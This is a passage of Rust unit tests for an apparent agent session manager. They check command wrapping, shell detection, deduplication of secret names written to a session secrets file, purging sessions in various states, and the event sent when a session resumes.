    fn test_wrap_command_empty_string() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("", &id, "test", None);
        // Empty command is not a shell command, so gets agent wrapper
        assert!(cmd.contains("-l -c"));
        assert!(cmd.contains("[pulpo] Agent exited"));
    }

    #[test]
    fn test_wrap_command_very_long() {
        let id = uuid::Uuid::new_v4();
        let long_cmd = "echo ".to_owned() + &"a".repeat(10_000);
        let cmd = wrap_command(&long_cmd, &id, "test", None);
        assert!(cmd.contains(&"a".repeat(10_000)));
        assert!(cmd.contains("-l -c"));
    }

    #[test]
    fn test_is_shell_command_with_whitespace() {
        // Trailing whitespace in basename should be trimmed
        assert!(is_shell_command("bash "));
        assert!(is_shell_command("/bin/bash "));
    }

    #[test]
    fn test_is_shell_command_bash_with_args_is_not_shell() {
        // "bash -c 'cmd'" is not a bare shell — it's running a command
        assert!(!is_shell_command("bash -c 'echo hello'"));
    }

    // -- create_session: ink secrets dedup --

    #[tokio::test]
    async fn test_ink_secrets_dedup_with_request_overlap() {
        let mut inks = HashMap::new();
        inks.insert(
            "shared-secrets".into(),
            InkConfig {
                command: Some("claude".into()),
                secrets: vec!["SHARED_SECRET".into(), "INK_ONLY".into()],
                ..InkConfig::default()
            },
        );
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        store
            .set_secret("SHARED_SECRET", "shared-val")
            .await
            .unwrap();
        store.set_secret("INK_ONLY", "ink-val").await.unwrap();
        store.set_secret("REQ_ONLY", "req-val").await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, inks, None).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "dedup-test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: Some("shared-secrets".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            // SHARED_SECRET overlaps with ink, REQ_ONLY is new
            secrets: Some(vec!["SHARED_SECRET".into(), "REQ_ONLY".into()]),
        };
        let session = mgr.create_session(req).await.unwrap();

        // Verify the secrets file contains all 3 secrets (no duplicates)
        let data_dir = mgr.store().data_dir();
        let secrets_path = format!("{data_dir}/secrets/secrets-{}.sh", session.id);
        let content = std::fs::read_to_string(&secrets_path).unwrap();
        // Count occurrences of SHARED_SECRET — should appear exactly once
        let shared_count = content.matches("SHARED_SECRET").count();
        assert_eq!(
            shared_count, 1,
            "SHARED_SECRET should not be duplicated: {content}"
        );
        assert!(content.contains("INK_ONLY"));
        assert!(content.contains("REQ_ONLY"));
    }

    // -- stop_session with purge on various statuses --

    #[tokio::test]
    async fn test_stop_purge_creating_session_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();
        // Force status to Creating
        sqlx::query("UPDATE sessions SET status = 'creating' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        // stop_session handles any status — stops backend then optionally purges
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_purge_lost_session_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_purge_ready_session_succeeds() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'ready' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    // -- resume_session emits event --

    #[tokio::test]
    async fn test_resume_session_emits_event() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("resume-evt")).await.unwrap();
        let _ = event_rx.recv().await; // drain create event
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        let _resumed = mgr.resume_session(&id).await.unwrap();
        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.status, "active");
        assert_eq!(se.previous_status.as_deref(), Some("lost"));
    }
}
